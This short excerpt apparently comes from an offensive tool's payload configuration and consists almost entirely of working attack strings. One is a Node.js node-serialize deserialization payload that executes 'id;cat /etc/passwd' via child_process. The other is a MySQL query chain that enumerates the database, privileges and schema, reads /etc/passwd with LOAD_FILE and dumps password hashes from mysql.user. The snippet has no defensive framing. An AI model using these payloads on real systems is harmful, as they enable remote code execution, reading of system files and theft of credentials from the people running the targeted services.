...
"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('id;cat /etc/passwd', function(error, stdout, stderr) { console.log(stdout) });}()"
    ...
    mysql: {
        ...
        sample: `SELECT "User, DB" as test, user() as v1, system_user() as v2,  database() as v3 UNION

SELECT "Passwd File", LOAD_FILE('/etc/passwd'), "", "" UNION
        
SELECT "Host, Version, DataDir", @@hostname, @@version, @@datadir UNION
        
SELECT "All tables" as test, table_schema as v1,table_name as v2,table_type as v3 FROM information_schema.tables WHERE table_type != 'SYSTEM VIEW' and table_schema != 'mysql' and table_schema != 'performance_schema' UNION
        
SELECT "Grantee,PrivType,IsGrantable", grantee, privilege_type, is_grantable FROM information_schema.user_privileges UNION
        
SELECT "Columns", table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != 'performance_schema' AND table_schema != 'information_schema' AND table_schema != 'mysql' UNION
        
SELECT "Columns", table_schema, table_name, column_name FROM information_schema.columns WHERE table_name = 'user' UNION
        
SELECT "Password Hashes",host, user, password FROM mysql.user;
        
#SELECT "User, DB" as test, user() as v1, system_user() as v2,  database() as v3 INTO dumpfile '/tmp/somefile';
...
# priv, list user privs SELECT grantee, table_schema, privilege_type FROM information_schema.schema_privileges; 
